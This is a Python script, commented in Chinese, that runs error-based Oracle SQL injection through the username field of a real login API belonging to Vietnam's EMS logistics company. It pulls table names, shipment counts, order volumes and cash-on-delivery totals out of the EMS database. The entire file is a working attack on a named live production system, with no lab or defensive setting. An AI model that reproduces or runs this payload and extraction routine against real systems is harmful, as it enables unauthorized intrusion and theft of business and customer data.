#!/usr/bin/env python3
"""
重新查找真实的订单量 - 越南第一物流不可能这么少！
"""

import requests
import json
import time

class RealVolumeInvestigator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def check_total_volume(self):
        """检查表的总数据量"""
        print("=" * 80)
        print("📊 检查各表的总数据量（不限日期）")
        print("=" * 80)
        
        tables = [
            "EMS.SHIPMENT",
            "EMS.E1E2_PH",
            "EMS.E1E2_PH_TEMP_DATA2_LOG",
            "EMS.E1E2_PH_LOG",
        ]
        
        for table in tables:
            print(f"\n🔎 {table}:")
            
            # 总记录数
            query1 = f"SELECT COUNT(*) FROM {table}"
            total = self.extract_via_error(query1)
            if total:
                print(f"   总记录数: {total:>15}")
            
            # 最近一周
            query2 = f"SELECT COUNT(*) FROM {table} WHERE ROWNUM<=1000000"
            week = self.extract_via_error(query2)
            if week:
                print(f"   前100万条: {week:>15}")
            
            time.sleep(2)
    
    def check_october_total(self):
        """检查10月份总订单"""
        print("\n" + "=" * 80)
        print("📅 10月份总订单量")
        print("=" * 80)
        
        queries = [
            ("E1E2_PH - 10月总记录", 
             "SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY LIKE '202510%'"),
            
            ("E1E2_PH - 10月不同MABC", 
             "SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY LIKE '202510%'"),
            
            ("SHIPMENT - 10月总订单", 
             "SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE LIKE '202510%'"),
            
            ("SHIPMENT - 10月不同CODE", 
             "SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE LIKE '202510%'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(2)
    
    def find_all_tables_with_data(self):
        """查找所有有大量数据的表"""
        print("\n" + "=" * 80)
        print("🔍 查找EMS下所有有大量数据的表")
        print("=" * 80)
        
        # 获取所有表名
        print("\n🔎 EMS schema下的所有表（按行数排序）:")
        
        query = "SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMS' AND ROWNUM<=20 ORDER BY NUM_ROWS DESC"
        result = self.extract_via_error(query)
        if result:
            print(f"   表名: {result}")
        
        time.sleep(2)
    
    def check_different_date_formats(self):
        """检查不同的日期格式"""
        print("\n" + "=" * 80)
        print("📅 检查不同日期格式的订单数")
        print("=" * 80)
        
        date_formats = [
            ("20251010", "YYYYMMDD格式"),
            ("2025-10-10", "YYYY-MM-DD格式"),
            ("10/10/2025", "MM/DD/YYYY格式"),
            ("202510", "YYYYMM格式（整月）"),
        ]
        
        for date_val, desc in date_formats:
            print(f"\n🔎 {desc} ({date_val}):")
            
            # E1E2_PH
            if len(date_val) == 8:  # YYYYMMDD
                query1 = f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date_val}'"
            elif len(date_val) == 6:  # YYYYMM
                query1 = f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY LIKE '{date_val}%'"
            else:
                query1 = f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE TO_CHAR(NGAY)='{date_val}'"
            
            result1 = self.extract_via_error(query1)
            if result1:
                print(f"   E1E2_PH: {result1}")
            
            time.sleep(1.5)
    
    def check_mabc_distribution(self):
        """检查MABC的分布范围"""
        print("\n" + "=" * 80)
        print("🔢 检查MABC的数值范围")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("最小MABC", 
             f"SELECT MIN(MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("最大MABC", 
             f"SELECT MAX(MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("MABC范围", 
             "计算中..."),
            
            ("检查是否所有MABC都在范围内", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND MABC BETWEEN '100000' AND '999999'"),
        ]
        
        min_mabc = None
        max_mabc = None
        
        for name, query in queries:
            if name == "MABC范围":
                if min_mabc and max_mabc:
                    range_val = int(max_mabc) - int(min_mabc) + 1
                    print(f"\n🔎 {name}:")
                    print(f"   范围: {min_mabc} - {max_mabc}")
                    print(f"   跨度: {range_val:,} 个号码")
                continue
            
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
                if name == "最小MABC":
                    min_mabc = result
                elif name == "最大MABC":
                    max_mabc = result
            time.sleep(1.5)
    
    def check_if_partitioned(self):
        """检查是否有分区表"""
        print("\n" + "=" * 80)
        print("🗂️  检查是否有按日期分区的表")
        print("=" * 80)
        
        queries = [
            ("E1E2_PH是否分区", 
             "SELECT PARTITIONED FROM ALL_TABLES WHERE TABLE_NAME='E1E2_PH' AND OWNER='EMS'"),
            
            ("SHIPMENT是否分区", 
             "SELECT PARTITIONED FROM ALL_TABLES WHERE TABLE_NAME='SHIPMENT' AND OWNER='EMS'"),
            
            ("查找分区表", 
             "SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMS' AND PARTITIONED='YES' AND ROWNUM<=5"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(1.5)
    
    def estimate_daily_capacity(self):
        """估算每日处理能力"""
        print("\n" + "=" * 80)
        print("📈 估算EMS日处理能力")
        print("=" * 80)
        
        # 查询近7天数据
        print("\n🔎 近7天订单量趋势:")
        
        dates = ['20251004', '20251005', '20251006', '20251007', '20251008', '20251009', '20251010']
        
        total_week = 0
        valid_days = 0
        
        for date in dates:
            query = f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"
            count = self.extract_via_error(query)
            if count and count.isdigit():
                day_count = int(count)
                total_week += day_count
                valid_days += 1
                print(f"   {date}: {day_count:>6} 个MABC")
            time.sleep(1.5)
        
        if valid_days > 0:
            avg = total_week / valid_days
            print(f"\n平均每天: {avg:.0f} 个MABC")
            print(f"7天总计: {total_week:,} 个MABC")
    
    def check_real_business_volume(self):
        """查看真实业务量指标"""
        print("\n" + "=" * 80)
        print("💰 业务量指标检查")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("当天代收金额总计", 
             f"SELECT SUM(SO_TIEN_THU_HO) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("有代收金额的订单数", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND SO_TIEN_THU_HO>0"),
            
            ("10月份代收总金额", 
             "SELECT SUM(SO_TIEN_THU_HO) FROM EMS.E1E2_PH WHERE NGAY LIKE '202510%'"),
            
            ("SHIPMENT表10月总金额", 
             "SELECT SUM(TOTAL_AMOUNT) FROM EMS.SHIPMENT WHERE CREATE_DATE LIKE '202510%'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                if result.isdigit():
                    amount = int(result)
                    print(f"   ✅ {amount:,} VND")
                    if amount > 1000000:
                        print(f"   💵 约 ${amount/23000:,.0f} USD")
                else:
                    print(f"   ✅ {result}")
            time.sleep(2)
    
    def run_investigation(self):
        """运行完整调查"""
        print("=" * 80)
        print("🔍 越南EMS真实订单量深度调查")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行调查
        self.check_total_volume()
        self.check_october_total()
        self.estimate_daily_capacity()
        self.check_mabc_distribution()
        self.check_real_business_volume()
        self.check_if_partitioned()
        self.check_different_date_formats()
        self.find_all_tables_with_data()
        
        # 总结
        print("\n" + "=" * 80)
        print("📊 调查总结")
        print("=" * 80)
        
        print("\n可能的解释：")
        print("  1️⃣ 325个MABC可能真的就是当天的邮件包裹数")
        print("  2️⃣ 2,290个SHIPMENT可能是电商专线订单")
        print("  3️⃣ 可能还有其他业务系统/数据库没查到")
        print("  4️⃣ 可能有按区域、业务类型分的多个系统")
        print("  5️⃣ 这个系统可能只是EMS业务的一部分")
        
        print("\n💡 关键问题：")
        print("  • 越南EMS每天处理多少包裹？")
        print("  • 这个数据库是否包含所有业务？")
        print("  • 是否有其他独立的业务系统？")
        
        print("\n" + "=" * 80)
        print("🎉 调查完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    investigator = RealVolumeInvestigator(target_url)
    investigator.run_investigation()
